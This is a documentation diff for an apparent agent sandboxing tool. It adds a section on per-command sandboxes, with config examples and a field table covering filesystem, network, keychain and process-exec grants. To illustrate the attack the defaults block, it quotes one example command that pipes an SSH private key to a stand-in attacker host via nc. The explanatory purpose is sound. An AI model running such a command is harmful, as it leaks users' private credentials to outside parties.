@@ -506,6 +506,62 @@ use `--no-diagnostics`.
 }
 ```
 
+## Per-command Sandboxes
+
+The `mediation.commands[].sandbox` field applies a scoped Seatbelt/Landlock sandbox to a specific command when it is invoked through the mediation shim. This lets you grant a credential-fetching tool access to `~/.ssh` or `~/.kube` without exposing those paths to the agent process itself.
+
+```json
+{
+  "mediation": {
+    "commands": [
+      {
+        "name": "kubectl",
+        "sandbox": {
+          "fs_read": ["~/.kube", "~/.config/ddtool"],
+          "fs_write": ["~/.config/ddtool"],
+          "allow_commands": ["ddtool"],
+          "network": { "allowed_hosts": ["*.staging.dog"] }
+        }
+      }
+    ]
+  }
+}
+```
+
+### Sandbox fields
+
+| Field | Type | Default | Description |
+|-------|------|---------|-------------|
+| `fs_read` | `string[]` | `[]` | Directories the command may read. Supports `~`, `$VAR`, `$GIT_ROOT`, and `@git:*` tokens. |
+| `fs_read_file` | `string[]` | `[]` | Individual files the command may read. |
+| `fs_write` | `string[]` | `[]` | Directories the command may write. |
+| `fs_write_file` | `string[]` | `[]` | Individual files the command may write. |
+| `network` | object | `{}` | Network policy. `{}` inherits the session network mode; `{ "block": true }` cuts all network; `{ "allowed_hosts": [...] }` restricts to specific hosts via a local proxy. |
+| `keychain_access` | `bool` | `false` | macOS only. Grants read access to the login keychain DB so the command can retrieve system credentials. |
+| `allow_commands` | `string[]` | `[]` | Commands that may be invoked directly inside this sandbox without re-routing through the mediation shim. Listed binaries bypass the shim and run with the caller's sandbox grants. |
+| `allow_process_exec` | `bool` | `false` | When `false` (default), process-exec is denied except for the command's own binary, the nono-shim, and any `allow_commands` targets. Set to `true` for commands with broad helper sprawl — git hooks, plugin runners, scripting runtimes — where listing every binary is impractical. |
+
+### `allow_process_exec`
+
+By default, a per-command sandbox blocks `process-exec` entirely except for an explicit allowlist (the command itself, the nono-shim, and `allow_commands` targets). This closes the ProxyCommand exfiltration class: a sandboxed `ssh` command with `~/.ssh` read access can no longer shell out to `/bin/sh -c 'cat id_ed25519 | nc evil.example'`.
+
+Commands that legitimately spawn arbitrary subprocesses — hooks, plugin runners, build toolchains — need to opt out:
+
+```json
+{
+  "name": "git",
+  "sandbox": {
+    "allow_commands": ["ssh"],
+    "allow_process_exec": true,
+    "fs_read": [".", "$GIT_ROOT", "@git:hooks-path"]
+  }
+}
+```
+
+<Warning>
+  Setting `allow_process_exec: true` widens the sandbox back to its pre-v0.59.0 behaviour for that command. Any subprocess the command spawns can exec arbitrary binaries within the sandbox's filesystem grants. Use it only for commands where the set of subprocesses is too dynamic to enumerate in `allow_commands`.
+</Warning>
+
 ## Target Binary
 
 User profiles can declare a `binary` field to specify the program that nono should execute. This makes the trailing `-- <command>` optional:
